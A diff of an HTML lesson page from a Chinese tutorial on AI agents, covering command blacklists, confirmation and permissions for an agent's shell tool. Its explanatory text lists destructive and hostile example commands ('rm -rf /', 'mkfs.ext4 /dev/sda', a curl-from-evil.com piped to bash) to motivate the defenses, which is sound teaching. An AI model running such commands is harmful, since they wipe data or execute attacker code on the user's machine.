@@ -4,9 +4,24 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>07. 三道安全防线 | 从零开始理解 Agent</title>
+  <meta name="description" content="最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。">
+  <meta name="theme-color" content="#1f2430">
+  <link rel="canonical" href="https://githubxsy.github.io/nanoAgent/safety.html">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="从零开始理解 Agent">
+  <meta property="og:title" content="07. 三道安全防线 | 从零开始理解 Agent">
+  <meta property="og:description" content="最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。">
+  <meta property="og:url" content="https://githubxsy.github.io/nanoAgent/safety.html">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="07. 三道安全防线 | 从零开始理解 Agent">
+  <meta name="twitter:description" content="最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。">
   <link rel="stylesheet" href="assets/style.css">
+  <script defer src="assets/site.js"></script>
 </head>
 <body class="article-body">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="reading-progress" aria-hidden="true"><span class="reading-progress-bar"></span></div>
   <div class="site-shell">
     <header class="site-header">
       <a class="brand" href="index.html">
@@ -17,20 +32,68 @@
         <a href="index.html#path">学习路径</a>
         <a href="index.html#map">能力地图</a>
         <a href="index.html#chapters">全部章节</a>
+        <a href="https://github.com/GitHubxsy/nanoAgent">GitHub</a>
       </nav>
     </header>
 
-    <main class="article-layout">
+    <main class="article-layout" id="main-content">
       <aside class="article-sidebar">
         <div class="sidebar-card">
           <p class="eyebrow">第 07 讲</p>
-          <h1>三道安全防线</h1>
+          <h2 class="lesson-title">三道安全防线</h2>
           <p>最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。</p>
           <div class="chip-row">
             <span class="chip">关键</span>
             <span class="chip">15 分钟</span>
             <span class="chip">288 行代码</span>
           </div>
+        </div>
+
+        <div class="sidebar-card">
+          <h2>课程导航</h2>
+          <div class="chapter-rail">
+            <a class="chapter-rail-link" href="essence.html">
+              <span class="course-step">第 01 讲</span>
+              <strong>底层原理，只有 100 行</strong>
+              <small>本质 · Agent = LLM + 工具 + 循环</small>
+            </a>
+            
+            <a class="chapter-rail-link" href="memory.html">
+              <span class="course-step">第 02 讲</span>
+              <strong>记忆与规划</strong>
+              <small>记忆 · 持久记忆 + Plan-then-Execute</small>
+            </a>
+            
+            <a class="chapter-rail-link" href="skills-mcp.html">
+              <span class="course-step">第 03 讲</span>
+              <strong>Rules、Skills 与 MCP</strong>
+              <small>扩展 · 行为约束 + 外部能力接入</small>
+            </a>
+            
+            <a class="chapter-rail-link" href="subagent.html">
+              <span class="course-step">第 04 讲</span>
+              <strong>SubAgent 子智能体</strong>
+              <small>分工 · 委派 + 上下文隔离</small>
+            </a>
+            
+            <a class="chapter-rail-link" href="teams.html">
+              <span class="course-step">第 05 讲</span>
+              <strong>多智能体团队协作</strong>
+              <small>协作 · 角色化协作 + 生命周期管理</small>
+            </a>
+            
+            <a class="chapter-rail-link" href="compact.html">
+              <span class="course-step">第 06 讲</span>
+              <strong>上下文压缩</strong>
+              <small>压缩 · Summary + Recent Window</small>
+            </a>
+            
+            <a class="chapter-rail-link is-current" href="safety.html">
+              <span class="course-step">第 07 讲</span>
+              <strong>三道安全防线</strong>
+              <small>安全 · 风险隔离 + 人机边界</small>
+            </a>
+            </div>
         </div>
 
         <div class="sidebar-card">
@@ -41,8 +104,7 @@
 
         <div class="sidebar-card">
           <h2>目录</h2>
-          <nav class="toc"><a class="toc-link level-1" href="#从零开始理解-agent七agent-执行-rm--rf-怎么办三道安全防线">从零开始理解 Agent（七）：Agent 执行 rm -rf / 怎么办？三道安全防线</a>
-<a class="toc-link level-2" href="#一agent-的安全问题到底有多严重">一、Agent 的安全问题到底有多严重？</a>
+          <nav class="toc"><a class="toc-link level-2" href="#一agent-的安全问题到底有多严重">一、Agent 的安全问题到底有多严重？</a>
 <a class="toc-link level-2" href="#二三道防线的设计思路">二、三道防线的设计思路</a>
 <a class="toc-link level-2" href="#三防线-1命令黑名单">三、防线 1：命令黑名单</a>
 <a class="toc-link level-3" href="#黑名单能拦住所有危险命令吗">黑名单能拦住所有危险命令吗？</a>
@@ -58,22 +120,32 @@
 
         <div class="sidebar-card">
           <h2>源码入口</h2>
-          <a class="source-link" href="../07-safety/agent-safe.md">查看原始文章</a>
-          <a class="source-link" href="../07-safety/agent-safe.py">查看示例代码</a>
+          <a class="source-link" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.md">查看 GitHub 原始文章</a>
+          <a class="source-link" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.py">查看 GitHub 示例代码</a>
         </div>
       </aside>
 
       <article class="article-main">
         <section class="article-hero">
+          <div class="breadcrumbs">
+            <a href="index.html">课程首页</a>
+            <span>/</span>
+            <a href="index.html#chapters">章节目录</a>
+            <span>/</span>
+            <span>第 07 讲</span>
+          </div>
           <p class="eyebrow">Agent Tutorial</p>
           <h1>07. 三道安全防线</h1>
           <p class="lead">最后收束到真实落地最不能跳过的一层：权限、确认、黑名单和风险控制。</p>
           <div class="tag-row"><span class="tag">Safety</span><span class="tag">Permissions</span><span class="tag">Guardrails</span></div>
+          <div class="hero-actions">
+            <a class="primary-btn" href="index.html#chapters">返回课程首页</a>
+            <a class="secondary-btn" href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/07-safety/agent-safe.md">查看 GitHub 原文</a>
+          </div>
         </section>
 
         <section class="content-card markdown-body">
-          <h1 id="从零开始理解-agent七agent-执行-rm--rf-怎么办三道安全防线">从零开始理解 Agent（七）：Agent 执行 rm -rf / 怎么办？三道安全防线</h1>
-<blockquote><strong>「从零开始理解 Agent」系列</strong> —— 从一个极简开源项目 <a href="https://github.com/GitHubxsy/nanoAgent">nanoAgent</a> 出发，逐层拆解 OpenClaw / Claude Code 等 AI Agent 背后的全部核心概念。<br>- <a href="essence.html">第一篇：底层原理，只有 100 行</a> —— 工具 + 循环<br>- <a href="memory.html">第二篇：记忆与规划</a> —— 182 行<br>- <a href="skills-mcp.html">第三篇：Rules、Skills 与 MCP</a> —— 265 行<br>- <a href="subagent.html">第四篇：SubAgent 子智能体</a> —— 192 行<br>- <a href="teams.html">第五篇：多智能体协作与编排</a> —— 270 行<br>- <a href="compact.html">第六篇：上下文压缩</a> —— 169 行<br>- <strong>第七篇：安全与权限控制</strong>（本文）—— 219 行</blockquote>
+          <blockquote><p><strong>「从零开始理解 Agent」系列</strong> —— 从一个极简开源项目 <a href="https://github.com/GitHubxsy/nanoAgent">nanoAgent</a> 出发，逐层拆解 OpenClaw / Claude Code 等 AI Agent 背后的全部核心概念。</p><ul><li><a href="essence.html">第一篇：底层原理，只有 100 行</a> —— 工具 + 循环</li><li><a href="memory.html">第二篇：记忆与规划</a> —— 182 行</li><li><a href="skills-mcp.html">第三篇：Rules、Skills 与 MCP</a> —— 265 行</li><li><a href="subagent.html">第四篇：SubAgent 子智能体</a> —— 192 行</li><li><a href="teams.html">第五篇：多智能体协作与编排</a> —— 270 行</li><li><a href="compact.html">第六篇：上下文压缩</a> —— 169 行</li><li><strong>第七篇：安全与权限控制</strong>（本文）—— 219 行</li></ul></blockquote>
 <p>前六篇我们一直在给 Agent 加能力。但有一个危险我们一直视而不见：<strong>Agent 手里有一把没有保险的枪。</strong></p>
 <p>回忆第一篇中的 <code>execute_bash</code> 工具——它可以执行任意 shell 命令。任意。包括 <code>rm -rf /</code>、<code>mkfs.ext4 /dev/sda</code>、<code>curl http://evil.com | bash</code>。LLM 不是完美的，它有可能因为理解错误、幻觉、或者 prompt 注入而执行危险操作。</p>
 <p>这不是理论风险。只要你让 Agent 干过真正的活，一定遇到过它试图做一些你没预料到的事情。</p>
@@ -411,6 +483,16 @@ def execute_tool(name, args):
         </nav>
       </article>
     </main>
+    
+    <footer class="site-footer">
+      <p>内容基于 nanoAgent 的前七篇文章重组，适配为课程型教学网站。</p>
+      <div class="footer-links">
+        <a href="https://github.com/GitHubxsy/nanoAgent">GitHub 仓库</a>
+        <a href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/README_CN.md">系列导读</a>
+        <a href="https://github.com/GitHubxsy/nanoAgent/blob/book/agent/build_site.py">站点生成器</a>
+      </div>
+    </footer>
+    
   </div>
 </body>
 </html>
